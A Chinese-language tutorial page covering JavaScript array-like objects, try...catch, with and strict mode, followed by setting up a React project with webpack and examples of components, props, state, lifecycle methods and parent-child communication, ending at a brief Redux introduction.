<h2 id="类数组"><a href="#类数组" class="headerlink" title="类数组"></a>类数组</h2><p>我们知道有两种数据叫做数组和对象，但是我们其实可以用对象来模拟出数组的效果，我们把这种对象叫做类数组。</p>
<p>我们前面提到的arguments实参列表就是一个类数组。</p>
<p>类数组并不是一个数组，但是它可以表现出数组的特性。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arrObj = &#123;</span><br><span class="line">  <span class="string">"0"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">"1"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="string">"2"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"length"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">"push"</span>: <span class="built_in">Array</span>.prototype.push</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">arrObj.push(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arrObj);<span class="comment">//&#123;0: 1, 1: 2, 2: 3, 3: 4, length: 4&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>这样我们就创造了一个类数组，它表现了出数组的特性。</p>
<p>我们会发现它自动改变了length值，这就非常神奇了。</p>
<p>其实这个类数组的关键就在这个length属性上，如果没有length属性，那么就是一个普通的对象，即使有push方法也不能使用。</p>
<p>我们来模拟一下数组的push方法的实现：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.push = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>[<span class="keyword">this</span>.length++] = num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="try…catch"><a href="#try…catch" class="headerlink" title="try…catch"></a>try…catch</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般是用来检测可能出错的代码的。</p>
<p>我们把可能出错的代码块放入try里面，然后把如果出错后的处理代码放到catch里面，finally就是最后都会走的代码。</p>
<p>catch的参数e一定要写上，系统会自动将错误信息传进去，错误信息一般有6种：</p>
<p>1.EvalError eval()，使用与定义不一致<br>2.RangeError，数值越界<br>3.ReferenceError，非法或不能识别的引用数值<br>4.SyntaxError，发生语法解析错误<br>5.TypeError，操作数类型错误<br>6.URIError，URI处理函数使用不当</p>
<p>其中3和4比较常见。</p>
<p>当try里面的代码出错了，try里面出错代码后面的代码就不会执行了，但是在try外面的代码还是正常执行的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);<span class="comment">// ReferenceError: a is not defined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);<span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="with"><a href="#with" class="headerlink" title="with"></a>with</h2><p>with () {}的作用是改变作用域链，它可以把括号里面的执行期上下文或者作用域放在自己的作用域链的最顶端。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">a</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">111</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">222</span>;</span><br><span class="line">  <span class="keyword">with</span>(obj) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);<span class="comment">// 123</span></span><br><span class="line">    <span class="built_in">console</span>.log(b);<span class="comment">// 222</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure></p>
<p>如果没有with，在test函数里面作用域链的最顶端应该是自身，但是使用with之后，我们把obj放在了作用域链的最顶端。</p>
<p>with改变作用域链，很影响性能，一般不建议使用。</p>
<h2 id="ES5严格模式"><a href="#ES5严格模式" class="headerlink" title="ES5严格模式"></a>ES5严格模式</h2><p>es5的严格模式是一种全新的es5规范，在这个模式下，有一些es3的不标准的规则就不能使用了。</p>
<p>我们只要在代码的第一行写上”use strict;”这一行字符串就可以进入严格模式了，不会对不兼容严格模式的浏览器产生影响。</p>
<p>严格模式还可以分为：</p>
<p>1.全局严格模式</p>
<p>2.局部严格模式</p>
<p>全局模式就是我们在整个js代码的第一行写上字符串，而局部模式就是在函数里面的第一行写上字符串。</p>
<p>使用严格模式可以强制使我们的代码避免使用一些不推荐的语法，例如：</p>
<p>1.不允许使用with函数、arguments.callee方法、func.caller属性。</p>
<p>2.变量赋值之前必须声明。</p>
<p>3.局部的this使用前必须被赋值，除了全局的this默认指向window，其他的默认都是undefiend。而且在非严格模式下，Person.call(null/undefined)之后，里面的this还是指向window。但是如果是严格模式的话，那么传递null，this就指向null，传递undefiend，this就指向undefiend。</p>
<p>4.拒绝重复属性和参数。不过有一些浏览器的属性名可以重复。</p>
<p>…</p>
<p>》》》》》》》》》》》》》》》》》</p>
<h1 id="react"><a href="#react" class="headerlink" title="react"></a>react</h1><p>React起源于Facebook内部项目，于2013年5月开源。</p>
<h2 id="react的几个重要特点"><a href="#react的几个重要特点" class="headerlink" title="react的几个重要特点"></a>react的几个重要特点</h2><p>1.虚拟DOM</p>
<p>传统web页面一般是直接操作DOM的，但是DOM操作是很耗性能的。react引入了虚拟DOM的概念，在需要更新DOM时，利用diff算法计算出虚拟DOM的最小更新操作，然后再进行更新，因此具有很好的性能。</p>
<p>由于DOM章节我们还没有学，这里你只需要把它理解为是html里的标签（如div、a等）。</p>
<p>2.组件化</p>
<p>整个页面是由一个个组件组合而成的，从而可以很方便地实现功能单元的解耦和复用。</p>
<p>3.单向数据流</p>
<p>数据是由外层组件向内层组件单向进行传递和更新的，所以让组件之间的关系变得简单、可预测。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本章所有示例的源码都可以在<a href="https://github.com/mfaying/react-demos" target="_blank" rel="noopener">react-demos</a>中查看、调试。</p>
<p>它只需要将仓库克隆下来，在根目录下先执行cnpm install安装依赖包，再执行npm run start即可调试。</p>
<p>执行npm、cnpm命令需要安装node.js环境</p>
<p>node.js安装非常简单，去<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">官网首页</a>下载长期支持版安装最新版本即可。</p>
<p>不过我们推荐大家安装课前概览中所介绍的<a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a>(Node Version Manager，它可以自由切换node.js版本)。</p>
<p>安装完node.js后，你就可以使用它自带的包管理npm了。</p>
<p>直接用npm下载依赖包非常耗时（因为连接的是国外的服务器），所以建议你切换到<a href="https://developer.aliyun.com/mirror/NPM?from=tnpm" target="_blank" rel="noopener">淘宝 NPM 镜像</a>，执行<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>，这样你就可以使用cnpm命令安装依赖包了。</p>
<h2 id="简易工程搭建"><a href="#简易工程搭建" class="headerlink" title="简易工程搭建"></a>简易工程搭建</h2><p>环境搭建好后，接下来让我们看看react-demos简易工程是怎么搭建的。</p>
<p>首先新建一个空文件夹，我们命名为react-demos</p>
<p>以该文件夹为根目录执行<code>npm init</code>，一路回车即可。</p>
<p>再执行依赖包安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install babel-preset-react@6.24.1 babel-core@6.26.3 babel-loader@7.1.5 babel-preset-env@1.7.0 babel-preset-stage-2@^6.24.1 web-webpack-plugin@4.6.7 webpack@4.44.1 webpack-cli@3.3.12 webpack-dev-server@3.11.0 --save-dev</span><br><span class="line"></span><br><span class="line">cnpm install react@16.13.1 react-dom@16.13.1 --save</span><br></pre></td></tr></table></figure>
<p>创建一个webpack.config.js文件，内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; WebPlugin &#125; = <span class="built_in">require</span>(<span class="string">"web-webpack-plugin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">"development"</span>,</span><br><span class="line">  entry: &#123;</span><br><span class="line">    <span class="comment">// 修改入口文件即可调试不同文件下的代码</span></span><br><span class="line">    app: <span class="string">"./src/01/index.js"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">"dist"</span>),</span><br><span class="line">    filename: <span class="string">"[name]_[contenthash:8].js"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    open: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        include: [path.resolve(__dirname, <span class="string">"src"</span>)],</span><br><span class="line">        loader: <span class="string">"babel-loader"</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          presets: [<span class="string">"react"</span>, <span class="string">"es2015"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> WebPlugin(&#123;</span><br><span class="line">      template: <span class="string">"./src/index.html"</span>,</span><br><span class="line">      filename: <span class="string">"index.html"</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>关于webpack的配置我们会在后面章节中介绍，这里大家拷贝内容即可。</p>
<h2 id="编写你的第一个react页面"><a href="#编写你的第一个react页面" class="headerlink" title="编写你的第一个react页面"></a>编写你的第一个react页面</h2><p>工程也搭建完毕了，接下来我们就可以编写react代码了。</p>
<p>我们创建代码目录结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src</span><br><span class="line">  01</span><br><span class="line">    index.jsx</span><br><span class="line">  02</span><br><span class="line">    index.jsx</span><br><span class="line">  03</span><br><span class="line">    index.jsx</span><br><span class="line">  ...</span><br><span class="line">  index.html</span><br></pre></td></tr></table></figure></p>
<p>我们主要在index.jsx文件中编写代码。01、02、03…目录是为了方便管理本章不同知识点的示例代码，这样你就可以通过修改webpack.config.js的入口文件地址来切换各个示例代码了。</p>
<p>其中，index.html文件我们不会去改动它，它的内容如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>react demos<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来在index.jsx文件中编写react代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入所需模块</span></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="comment">// const和var类似，它是ES6中的变量命名关键字，它命名的是一个常量。</span></span><br><span class="line">    <span class="keyword">const</span> text = <span class="string">'test'</span></span><br><span class="line">    <span class="comment">// jsx语法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;text&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将组件渲染到页面中</span></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p><code>class App extends Component</code>是react编写组件的方式，我们的页面就是由一个个组件组成的。</p>
<p>直接在JavaScript语言写html的语法叫JSX，它的基本语法规则是：遇到HTML标签（以 &lt; 开头），就用HTML规则解析；遇到代码块（以 { 开头），就用JavaScript规则解析。</p>
<p>ReactDom.render可以将组件实例（<code>&lt;App /&gt;</code>）转为HTML，并渲染到指定的DOM节点中。</p>
<p>此时我们在根目录下执行<code>npm run start</code>，就可以看到浏览器自动打开我们第一个react页面，页面中出现了test。</p>
<h2 id="行间样式和className"><a href="#行间样式和className" class="headerlink" title="行间样式和className"></a>行间样式和className</h2><p>react中元素的style属性可以添加行间样式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> style = &#123;</span><br><span class="line">      color: <span class="string">"red"</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;span className=<span class="string">"text"</span> style=&#123;style&#125;&gt;</span><br><span class="line">        test</span><br><span class="line">      &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>在开发中我们一般是为元素设置类名（由于class是保留字，需要使用className设置类名），然后在单独的样式文件中通过css的class选择器为元素添加样式，而非采用style属性，这样可以实现样式文件的解耦。</p>
<h2 id="this-props"><a href="#this-props" class="headerlink" title="this.props"></a>this.props</h2><p>在组件中，通过this.props属性可以获取向组件传递的参数，props改变会触发组件重新渲染（执行render函数）。</p>
<p>原生的数组map方法可以渲染列表，需要为列表中每一个子项添加一个唯一标识（react性能优化需要），否则会抛<code>Warning: Each child in a list should have a unique &quot;key&quot; prop.</code>警告。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; arr &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">        &#123;arr.map(<span class="function"><span class="params">item</span> =&gt;</span> (</span><br><span class="line">          &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">        ))&#125;</span></span><br><span class="line"><span class="regexp">      &lt;/u</span>l&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> <span class="attr">arr</span>=<span class="string">&#123;arr&#125;</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>此时页面中渲染出了1、2、3。</p>
<h2 id="this-state"><a href="#this-state" class="headerlink" title="this.state"></a>this.state</h2><p>state是组件的内部状态，react将组件看成是一个状态机。通过调用this.setState方法可以改变state，state的改变会触发组件重新渲染（执行render函数）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      value: <span class="string">""</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">this</span>.ref = React.createRef();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  onChange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      value: <span class="keyword">this</span>.ref.current.value</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; value &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input ref=&#123;<span class="keyword">this</span>.ref&#125; onChange=&#123;<span class="keyword">this</span>.onChange&#125;&gt;&lt;<span class="regexp">/input&gt;</span></span><br><span class="line"><span class="regexp">        &lt;span&gt;&#123;value&#125;&lt;/</span>span&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>组件中标签并不是真实的DOM节点，而是虚拟DOM（virtual DOM）。只有当它插入html文档后，才会变成真实的DOM。</p>
<p>这个例子我们还附带演示了如何从组件获取真实的DOM节点，也就是refs转发的使用方式。</p>
<h2 id="组件生命周期"><a href="#组件生命周期" class="headerlink" title="组件生命周期"></a>组件生命周期</h2><p><img src="https://wx-store.oss-cn-beijing.aliyuncs.com/c561beaa640.jpeg" alt="组件生命周期"></p>
<p>组件是个状态机，它的生命周期分成三大阶段：</p>
<h3 id="1-Mounting（装载组件，上侧虚线框）"><a href="#1-Mounting（装载组件，上侧虚线框）" class="headerlink" title="1.Mounting（装载组件，上侧虚线框）"></a>1.Mounting（装载组件，上侧虚线框）</h3><p>依次会经历：</p>
<p>getDefaultProps 初始化props</p>
<p>getInitialState 初始化state</p>
<p>componentWillMount 将要装载</p>
<p>render 渲染</p>
<p>componentDidMount 装载完毕，此时可以获取到更新后的DOM，AJAX请求也在这个生命周期调用</p>
<h3 id="2-Updating（正在更新，左下角虚线框）"><a href="#2-Updating（正在更新，左下角虚线框）" class="headerlink" title="2.Updating（正在更新，左下角虚线框）"></a>2.Updating（正在更新，左下角虚线框）</h3><p>组件装载完毕后，就处于运行阶段了。</p>
<p>当state或props改变，组件就会更新，重新渲染（执行render函数）。</p>
<p>此时会走下面的生命周期：</p>
<p>shouldComponentUpdate(nextProps, nextState) 返回一个boolean值，用于判断是否重新渲染，默认是true。</p>
<p>componentWillUpdate(nextProps, nextState) 将要render</p>
<p>render</p>
<p>componentDidUpdate(prevProps, prevState) render完成，此时能取到更新后的DOM。</p>
<p>我们可以注意到props改变时，会多走一个生命周期函数：</p>
<p>componentWillReceiveProps(nextProps) 将要接收新的props，这里你可以拿到nextProps的值（最终的props值）</p>
<h3 id="3-Unmounting（卸载，右下角虚线框）"><a href="#3-Unmounting（卸载，右下角虚线框）" class="headerlink" title="3.Unmounting（卸载，右下角虚线框）"></a>3.Unmounting（卸载，右下角虚线框）</h3><p>componentWillUnmount 组件将要卸载，这里一般会做一些清除操作，如清除定时器等。</p>
<p>在代码中你可以打印一下生命周期看看</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">    value: <span class="string">""</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillMount() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"componentWillMount"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"componentDidMount"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"render"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>控制台中会依次打印出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">componentWillMount</span><br><span class="line">render</span><br><span class="line">componentDidMount</span><br></pre></td></tr></table></figure>
<h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p>组件的数据来源，通常是通过Ajax请求从服务器获取的，我们一般在componentDidMount生命周期方法中调用Ajax请求，等到请求成功，再用this.setState方法将数据保存到组件的state中，同时state改变会触发UI重新渲染，页面展示出数据。</p>
<h2 id="子组件向父组件传递数据（通信）"><a href="#子组件向父组件传递数据（通信）" class="headerlink" title="子组件向父组件传递数据（通信）"></a>子组件向父组件传递数据（通信）</h2><p>由于react数据流是单向的，父组件向子组件传递数据只需要直接传参，再通过this.props获取就行了，而子组件向父组件传递数据则需要借助回调函数了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; onClick &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          onClick=&#123;() =&gt; &#123;</span><br><span class="line">            onClick(<span class="built_in">Math</span>.random().toString());</span><br><span class="line">          &#125;&#125;</span><br><span class="line">        &gt;</span><br><span class="line">          child button</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      text: <span class="string">""</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  onClick = <span class="function"><span class="params">text</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      text</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; text &#125; = <span class="keyword">this</span>.state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;Child onClick=&#123;<span class="keyword">this</span>.onClick&#125; /&gt;</span><br><span class="line">        &lt;span&gt;&#123;text&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">Parent</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>例子中在父组件定义点击事件的回调函数，并通过props传递个子组件，子组件的点击事件调用了该回调函数并将数据传递出去。</p>
<h2 id="this-props-children"><a href="#this-props-children" class="headerlink" title="this.props.children"></a>this.props.children</h2><p>它表示组件的所有子节点。有时候我们需要为组件的定义预留一些内容时会用到。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">"react-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;child&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;&#123;this.props.children&#125;&lt;/</span>div&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class App extends Component &#123;</span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return &lt;Child&gt;parent&lt;/</span>Child&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDom.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>页面中child和parent都会显示。</p>
<p>》》》》》》》</p>
<h1 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h1><p><a href="https://github.com/mfaying/redux-demos" target="_blank" rel="noopener">示例代码</a></p>
<h2 id="什么是Redux"><a href="#什么是Redux" class="headerlink" title="什么是Redux"></a>什么是Redux</h2><p>Redux是JavaScript状态容器，提供可预测的状态管理。 </p>
<h2 id="为什么要用Redux"><a href="#为什么要用Redux" class="headerlink" title="为什么要用Redux"></a>为什么要用Redux</h2><p>React其实是一个视图框架，随着JavaScript应用开发日趋复杂，需要管理的状态也越来越多，同时也要保证应用行为的可预测，仅用React难以支撑大型应用的开发，所以需要使用Redux。</p>
